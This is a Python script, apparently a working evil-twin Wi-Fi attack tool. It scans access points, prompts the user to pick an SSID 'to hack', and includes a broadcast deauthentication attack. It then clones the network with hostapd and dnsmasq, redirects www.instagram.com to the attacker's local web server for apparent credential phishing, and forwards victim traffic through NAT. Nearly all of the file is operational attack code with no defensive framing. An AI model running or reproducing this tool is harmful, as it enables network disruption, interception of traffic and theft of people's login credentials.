from _thread import start_new_thread
from scapy.all import *
from prettytable import PrettyTable
from scapy.layers.dhcp import DHCP
from scapy.layers.dot11 import RadioTap, Dot11Deauth, Dot11, Dot11Beacon
import sys
import netifaces as ni
import os
from scapy.layers.http import HTTPRequest
import json
from scapy.layers.inet import IP

ap_list = {}

def print_wifi_list():
    header = PrettyTable(['SSID', 'MAC ADRESS'])
    for ssid, mac_beacons in ap_list.items():
        header.add_row([ssid, str(mac_beacons)])
    print(header)


def choose_ssid():
    ssid_temp = input("Select SSID to hack \t")
    if ssid_temp in ap_list:
        return ssid_temp
    else:
        print(f"{ssid_temp} is currently unavailable")
        raise IOError


def deauth_attack(gateway_mac, interface):
    print("hello " + gateway_mac)
    target_mac = "ff:ff:ff:ff:ff:ff"
    #target_mac = "08:c5:e1:87:79:c1"
    packet = RadioTap() / Dot11(type=0, subtype=12, addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac) / Dot11Deauth(reason=7)
    sendp(packet, iface=interface, count=10000, inter=0.1)


def create_fake_ap(ssid, interface):
    print("create_fake_ap")
    nameOfDir = "Fake_AP"
    nameConfFile = f"{nameOfDir}/hostapd.conf"
    channel = 11
    text = f'interface={interface}\n' \
           f'driver=nl80211\n' \
           f'ssid={ssid}\n' \
           f'hw_mode=g\n' \
           f'channel={channel}'

    os.system(f"mkdir -p {nameOfDir}")
    write_file(nameConfFile, text)
    os.system(f"sudo hostapd {nameConfFile}")


def start_monitor(interfaceName):
    print(f'Change {interfaceName} to monitor mode')
    os.system(f'sudo ifconfig {interfaceName} down')
    os.system(f'sudo iwconfig {interfaceName} mode monitor')
    os.system(f'sudo ifconfig {interfaceName} up')


def start_monitor_airmon(interfaceName):
    print(f'Change {interfaceName} to monitor mode')
    os.system(f'sudo airmon-ng start {interfaceName}')


def change_host_file():
    apacheIP = ni.ifaddresses('wlp2s0')[ni.AF_INET][0]['addr'] 
    nameOfHostsFile = 'dnsmasq.hosts'
    text = apacheIP + ' ' + 'www.instagram.com'
    write_file(nameOfHostsFile, text)


def dnsmasq_service(interface):
    print("dnsmasq_service")
    nameOfDir = "Fake_AP"
    nameConfFile = f"{nameOfDir}/dnsmasq.conf"
    ip_Range = '192.168.1.2,192.168.1.30,255.255.255.0,12h'
    apIP = '192.168.1.1'
    dnsIP = '192.168.1.1'
    listen = '127.0.0.1'
    netmask = '255.255.255.0'
    text = f'interface={interface}\n' \
           f'dhcp-range={ip_Range}\n' \
           f'dhcp-option=3,{apIP}\n' \
           f'dhcp-option=6,{dnsIP}\n' \
           f'server=8.8.8.8\n' \
           f'listen-address={listen}\n' \
           'listen-address=192.168.1.1\n' \
           'addn-hosts=dnsmasq.hosts'



    write_file(nameConfFile, text)
    change_host_file()
    os.system(f'ifconfig {interface} up {apIP} netmask {netmask}')
    os.system(f'route add -net 192.168.1.0 netmask {netmask} gw {apIP}')
    os.system(f'dnsmasq -C {nameConfFile} -d')


def fowardTraffic():
    print("fowardTraffic")
    os.system('iptables --table nat --append POSTROUTING --out-interface wlp2s0 -j MASQUERADE')
    os.system('iptables --append FORWARD --in-interface wlan0mon -j ACCEPT')
    os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')


def write_file(fName, text, mode='w'):
    f = open(fName, mode)
    f.write(text)
    f.close()




def scanWifi(pkt):
    if pkt.haslayer(Dot11Beacon):  
        if pkt.type == 0 and pkt.subtype == 8:  
                ap_list[pkt.info.decode("utf-8")] = (pkt.addr3)
                
        


if __name__ == '__main__':
    interfaceName = sys.argv[1]
    start_monitor(interfaceName)
    print(f"Sniffing with {interfaceName} please wait...")
    sniff(prn=scanWifi, iface=interfaceName, timeout=15)
    print_wifi_list()
    ssid = choose_ssid()
    start_monitor_airmon(interfaceName)
    print("Start Deauthentication attack on " + ssid)
    interfaceName = "wlan0mon"
    #deauth_attack(ap_list[ssid], interfaceName)
    start_new_thread(create_fake_ap, (ssid, interfaceName,))
    start_new_thread(fowardTraffic, ())
    start_new_thread(dnsmasq_service, (interfaceName,))
    time.sleep(10)

